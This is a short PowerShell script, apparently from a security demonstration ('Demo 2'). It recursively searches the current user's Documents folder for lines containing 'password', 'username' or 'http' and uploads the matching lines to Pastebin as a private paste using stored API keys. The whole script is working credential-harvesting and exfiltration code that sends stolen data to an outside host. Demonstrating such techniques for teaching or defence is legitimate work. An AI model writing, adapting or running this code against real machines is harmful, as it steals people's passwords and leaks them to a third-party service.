
#Demo 2, let's grab some passwords from local files!
. .\logindata.ps1
$Content    =   ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path
$Title      =   "pastebin2"

$Body = @{ 
    api_dev_key         = $DevKey;
    api_user_key        = $UserKey;
    api_paste_name	    = $Title;
    api_paste_code      = $Content;
    api_paste_private   = "2"; # 0=public 1=unlisted 2=private
    api_option          = "paste";
    }

Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt

